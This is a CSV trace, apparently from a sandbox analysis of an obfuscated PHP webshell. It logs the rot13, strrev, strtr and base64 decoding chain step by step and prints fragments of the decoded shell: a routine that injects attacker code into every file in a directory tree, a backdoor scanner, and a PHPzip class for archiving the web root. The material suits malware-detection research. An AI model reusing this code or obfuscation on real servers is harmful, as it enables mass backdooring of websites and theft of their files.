uuid,file_md5,index,source,target,argc,argv,return,dynamic
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,684,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,685,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,686,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,687,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,688,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,689,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,690,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,691,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,692,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,693,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,694,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0DsWbDQ9yDPX0DsWxDPX0jBeSJMlWJPWxDPX0DsWxDPWbDQ9yDPWxDPX0jBa4wpvkmWhZKMfyzMxNlobAJMWxDPWxDPX0jBcxvVf9zAg9PE90wVbHTMiAHoXkFXmI""]]}","{""value"": ""MaIhL3Eco24tMT9spTSmp3WyqUIlovtxMTylYPEwo2EyYPE0rKOyYPEvo29fYPEznJkyqUyjMFN9VPpaYPEmnTIfoPN9VT15K3AbMJkfXKfAPtxxp2uiqlN9VTEiK3Abo3""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,695,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tMT9spTSmp3WyqUIlovtxMTylYPEwo2EyYPE0rKOyYPEvo29fYPEznJkyqUyjMFN9VPpaYPEmnTIfoPN9VT15K3AbMJkfXKfAPtxxp2uiqlN9VTEiK3Abo3""]]}","{""value"": ""ZnVuY3Rpb24gZG9fcGFzc3JldHVybigkZGlyLCRjb2RlLCR0eXBlLCRib29sLCRmaWxldHlwZSA9ICcnLCRzaGVsbCA9IG15X3NoZWxsKXsNCgkkc2hvdyA9IGRvX3Nob3""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,696,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gZG9fcGFzc3JldHVybigkZGlyLCRjb2RlLCR0eXBlLCRib29sLCRmaWxldHlwZSA9ICcnLCRzaGVsbCA9IG15X3NoZWxsKXsNCgkkc2hvdyA9IGRvX3Nob3""]]}","{""value"": ""function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){\r\n\t$show = do_show($dir);\r\n\tforeach($show as $file""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,697,pazihj,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){\r\n\t$show = do_show($dir);\r\n\tforeach($show as $file""]]}","{""value"": ""\\x00lambda_41""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,698,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){\r\n\t$show = do_show($dir);\r\n\tforeach($show as $files){\r\n\t\tif(is_dir($files) && $bool){\r\n\t\t\tdo_passreturn($files,$code,$type,$bool,$filetype,$shell);\r\n\t\t}else{\r\n\t\t\tif($files == $shell) continue;\r\n\t\t\tswitch($type){\r\n\t\t\t\tcase \""guama\"":\r\n\t\t\t\tif(debug($files,$filetype)){\r\n\t\t\t\t\tdo_write($files,\""ab\"",\""\\n\"".$code) ? html_n(JmCode(\""=NvCg0vc5z8f\"").$files.JmCode(\""==tClWTC\"")) : html_n(JmCode(\""=NvCg0P3jrdl\"").$files.JmCode(\""==tClWTC\""));\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""qingma\"":\r\n\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\tif(stristr($filecode,$code)){\r\n\t\t\t\t\t$newcode = str_replace($code,'',$filecode);\r\n\t\t\t\t\tdo_write($files,\""wb\"",$newcode) ? html_n(JmCode(\""=NvCg0vc5z8f\"").$files.JmCode(\""==tClWTC\"")) : html_n(JmCode(\""=NvCg0P3jrdl\"").$files.JmCode(\""==tClWTC\""));\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""tihuan\"":\r\n\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\tif(stristr($filecode,$code)){\r\n\t\t\t\t\t$newcode = str_replace($code,$filetype,$filecode);\r\n\t\t\t\t\tdo_write($files,\""wb\"",$newcode) ? html_n(JmCode(\""=NvCg0vc5z8f\"").$files.JmCode(\""==tClWTC\"")) : html_n(JmCode(\""=NvCg0P3jrdl\"").$files.JmCode(\""==tClWTC\""));\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""scanfile\"":\r\n\t\t\t\t$file = explode('/',$files);\r\n\t\t\t\tif(stristr($file[count($file)-1],$code)){\r\n\t\t\t\t\thtml_a(JmCode(\""==DCjMvp0yTMy1wpyMaouI2C\"").$files,$files);\r\n\t\t\t\t\techo '<br>';\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""scancode\"":\r\n\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\tif(stristr($filecode,$code)){\r\n\t\t\t\t\thtml_a(JmCode(\""==DCjMvp0yTMy1wpyMaouI2C\"").$files,$files);\r\n\t\t\t\t\techo '<br>';\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase \""scanphp\"":\r\n\t\t\t\t$fileinfo = pathinfo($files);\r\n\t\t\t\tif($fileinfo['extension'] == $code){\r\n\t\t\t\t\t$filecode = @implode('',@file($files));\r\n\t\t\t\t\tif(muma($filecode,$code)){\r\n\t\t\t\t\t\thtml_a(JmCode(\""==DCjMvp0yTMy1wpyMaouI2C\"").urlencode($files),JmCode(\""==De8Prf\""));\r\n\t\t\t\t\t\thtml_a(JmCode(\""=0QpzjJMx1wpyMaouI2C\"").urlencode($files),JmCode(\""==D/m6ol\""));\r\n\t\t\t\t\t\techo $files.'<br>';\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}}""]]}","{""value"": ""003E""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,699,pazihj,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,700,eval,pazihj,2.0,"{""value"": [[0, ""MtrIng"", ""9OvPA0KPX0jBcNaM+0lpcuTqxtFMm9TowMJPWbDQ7xvp0AUMhITWhVUqmWKnx5GYmyTn0EPYjMzCgZKnbEUWbHTqcW3qzyDPX0tPAfwVjNQrpOQZ4kyVWxDPWxtPA4PVc4""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,701,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,702,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,703,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,704,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,705,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,706,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,707,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,708,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,709,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,710,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,711,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""9OvPA0KPX0jBcNaM+0lpcuTqxtFMm9TowMJPWbDQ7xvp0AUMhITWhVUqmWKnx5GYmyTn0EPYjMzCgZKnbEUWbHTqcW3qzyDPX0tPAfwVjNQrpOQZ4kyVWxDPWxtPA4PVc4""]]}","{""value"": ""L2kup3ZtHRuDrzyjrj0XQDbWqzSlVPEznJkyK2AiqJ50VQ0tZPN7QDbWqzSlVPExLKEup3ElK2kyovNtVQ0tZQfAPty2LKVtWTEcpaA0py9fMJ4tCFNjBj0XPKMupvNxMz""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,712,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""L2kup3ZtHRuDrzyjrj0XQDbWqzSlVPEznJkyK2AiqJ50VQ0tZPN7QDbWqzSlVPExLKEup3ElK2kyovNtVQ0tZQfAPty2LKVtWTEcpaA0py9fMJ4tCFNjBj0XPKMupvNxMz""]]}","{""value"": ""Y2xhc3MgUEhQemlwew0KDQoJdmFyICRmaWxlX2NvdW50ID0gMCA7DQoJdmFyICRkYXRhc3RyX2xlbiAgID0gMDsNCgl2YXIgJGRpcnN0cl9sZW4gPSAwOw0KCXZhciAkZm""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,713,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Y2xhc3MgUEhQemlwew0KDQoJdmFyICRmaWxlX2NvdW50ID0gMCA7DQoJdmFyICRkYXRhc3RyX2xlbiAgID0gMDsNCgl2YXIgJGRpcnN0cl9sZW4gPSAwOw0KCXZhciAkZm""]]}","{""value"": ""class PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; \r\n\tvar $gzfilename;""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,714,pazihj,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""class PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; \r\n\tvar $gzfilename;""]]}","{""value"": ""\\x00lambda_42""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,715,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){class PHPzip{\r\n\r\n\tvar $file_count = 0 ;\r\n\tvar $datastr_len   = 0;\r\n\tvar $dirstr_len = 0;\r\n\tvar $filedata = ''; \r\n\tvar $gzfilename;\r\n\tvar $fp;\r\n\tvar $dirstr='';\r\n    function unix2DosTime($unixtime = 0) {\r\n        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);\r\n\r\n        if ($timearray['year'] < 1980) {\r\n        \t$timearray['year']    = 1980;\r\n        \t$timearray['mon']     = 1;\r\n        \t$timearray['mday']    = 1;\r\n        \t$timearray['hours']   = 0;\r\n        \t$timearray['minutes'] = 0;\r\n        \t$timearray['seconds'] = 0;\r\n        }\r\n\r\n        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |\r\n               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);\r\n    }\r\n\r\n\tfunction startfile($path = 'wwwroot.zip'){\r\n\t\t$this->gzfilename=$path;\r\n\t\tif($this->fp=@fopen($this->gzfilename,\""w\"")){\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\r\n    function addfile($data, $name){\r\n        $name     = str_replace('\\\\', '/', $name);\r\n\t\t\r\n\t\tif(strrchr($name,'/')=='/') return $this->adddir($name);\r\n\t\t\r\n        $dtime    = dechex($this->unix2DosTime());\r\n        $hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x' . $dtime[2] . $dtime[3]  . '\\x' . $dtime[0] . $dtime[1];\r\n        eval('$hexdtime = \""' . $hexdtime . '\"";');\r\n        $unc_len = strlen($data);\r\n        $crc     = crc32($data);\r\n        $zdata   = gzcompress($data);\r\n        $c_len   = strlen($zdata);\r\n        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);\r\n\t\t\r\n        $datastr  = \""\\x50\\x4b\\x03\\x04\"";\r\n        $datastr .= \""\\x14\\x00\""; \r\n        $datastr .= \""\\x00\\x00\"";\r\n        $datastr .= \""\\x08\\x00\""; \r\n        $datastr .= $hexdtime; \r\n        $datastr .= pack('V', $crc);\r\n        $datastr .= pack('V', $c_len);\r\n        $datastr .= pack('V', $unc_len);\r\n        $datastr .= pack('v', strlen($name));\r\n        $datastr .= pack('v', 0); \r\n        $datastr .= $name;\r\n        $datastr .= $zdata;\r\n        $datastr .= pack('V', $crc); \r\n        $datastr .= pack('V', $c_len);\r\n        $datastr .= pack('V', $unc_len);\r\n\r\n\r\n\t\tfwrite($this->fp,$datastr);\r\n\t\t$my_datastr_len = strlen($datastr);\r\n\t\tunset($datastr);\r\n\t\t\r\n        $dirstr  = \""\\x50\\x4b\\x01\\x02\"";\r\n        $dirstr .= \""\\x00\\x00\""; \r\n        $dirstr .= \""\\x14\\x00\"";\r\n        $dirstr .= \""\\x00\\x00\"";\r\n        $dirstr .= \""\\x08\\x00\"";\r\n        $dirstr .= $hexdtime;\r\n        $dirstr .= pack('V', $crc); \r\n        $dirstr .= pack('V', $c_len); \r\n        $dirstr .= pack('V', $unc_len);\r\n        $dirstr .= pack('v', strlen($name) );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('v', 0 );\r\n        $dirstr .= pack('V', 32 );\r\n        $dirstr .= pack('V',$this->datastr_len );\r\n        $dirstr .= $name;\r\n\t\t\r\n\t\t$this->dirstr .= $dirstr;\r\n\t\t\r\n\t\t$this -> file_count ++;\r\n\t\t$this -> dirstr_len += strlen($dirstr);\r\n\t\t$this -> datastr_len += $my_datastr_len;\t\r\n    }\r\n\r\n\tfunction adddir($name){ \r\n\t\t$name = str_replace(\""\\\\\"", \""/\"", $name); \r\n\t\t$datastr = \""\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\""; \r\n\t\t\r\n\t\t$datastr .= pack(\""V\"",0).pack(\""V\"",0).pack(\""V\"",0).pack(\""v\"", strlen($name) ); \r\n\t\t$datastr .= pack(\""v\"", 0 ).$name.pack(\""V\"", 0).pack(\""V\"", 0).pack(\""V\"", 0); \r\n\r\n\t\tfwrite($this->fp,$datastr);\r\n\t\t$my_datastr_len = strlen($datastr);\r\n\t\tunset($datastr);\r\n\t\t\r\n\t\t$dirstr = \""\\x50\\x4b\\x01\\x02\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\""; \r\n\t\t$dirstr .= pack(\""V\"",0).pack(\""V\"",0).pack(\""V\"",0).pack(\""v\"", strlen($name) ); \r\n\t\t$dirstr .= pack(\""v\"", 0 ).pack(\""v\"", 0 ).pack(\""v\"", 0 ).pack(\""v\"", 0 ); \r\n\t\t$dirstr .= pack(\""V\"", 16 ).pack(\""V\"",$this->datastr_len).$name; \r\n\t\t\r\n\t\t$this->dirstr .= $dirstr;\r\n\r\n\t\t$this -> file_count ++;\r\n\t\t$this -> dirstr_len += strlen($dirstr);\r\n\t\t$this -> datastr_len += $my_datastr_len;\t\r\n\t}\r\n\r\n\r\n\tfunction createfile(){\r\n\t\t$endstr = \""\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\"" .\r\n\t\t\t\t\tpack('v', $this -> file_count) .\r\n\t\t\t\t\tpack('v', $this -> file_count) .\r\n\t\t\t\t\tpack('V', $this -> dirstr_len) .\r\n\t\t\t\t\tpack('V""]]}","{""value"": ""003E""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,716,pazihj,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,717,eval,pazihj,2.0,"{""value"": [[0, ""MtrIng"", ""=0aPA0KPX0jBvNQZ4kSZjtUKv4FXcRTquETWb4JMfWUqmOPYaL1Wbf2LuOaYcxvpcETolE3Lxtvoykzp0AUVfpvIatlnwSTphxFXlyTMskzp0ATV+0PVmyTn0EPXz9JM6y""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,718,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,719,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,720,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,721,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,722,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,723,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,724,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,725,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,726,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,727,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,728,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""=0aPA0KPX0jBvNQZ4kSZjtUKv4FXcRTquETWb4JMfWUqmOPYaL1Wbf2LuOaYcxvpcETolE3Lxtvoykzp0AUVfpvIatlnwSTphxFXlyTMskzp0ATV+0PVmyTn0EPXz9JM6y""]]}","{""value"": ""L2kup3ZtMJShqzIlrj0XVPNtVPNtqzSlVPEiqKD9Wlp7QDbtVPNtMaIhL3Eco24tMJShqzIlXPExnKVcrj0XPJyzXROzqJ5wqTyioy9yrTymqUZbW2q6L29gpUWyp3ZaXF""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,729,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""L2kup3ZtMJShqzIlrj0XVPNtVPNtqzSlVPEiqKD9Wlp7QDbtVPNtMaIhL3Eco24tMJShqzIlXPExnKVcrj0XPJyzXROzqJ5wqTyioy9yrTymqUZbW2q6L29gpUWyp3ZaXF""]]}","{""value"": ""Y2xhc3MgZWFudmVyew0KICAgICAgdmFyICRvdXQ9Jyc7DQogICAgZnVuY3Rpb24gZWFudmVyKCRkaXIpew0KCWlmKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKS""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,730,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Y2xhc3MgZWFudmVyew0KICAgICAgdmFyICRvdXQ9Jyc7DQogICAgZnVuY3Rpb24gZWFudmVyKCRkaXIpew0KCWlmKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKS""]]}","{""value"": ""class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforea""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,731,pazihj,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""class eanver{\r\n      var $out='';\r\n    function eanver($dir){\r\n\tif(@function_exists('gzcompress')){\r\n\tif(count($dir) > 0){\r\n\tforea""]]}","{""value"": ""\\x00lambda_43""}","[0, 0]"
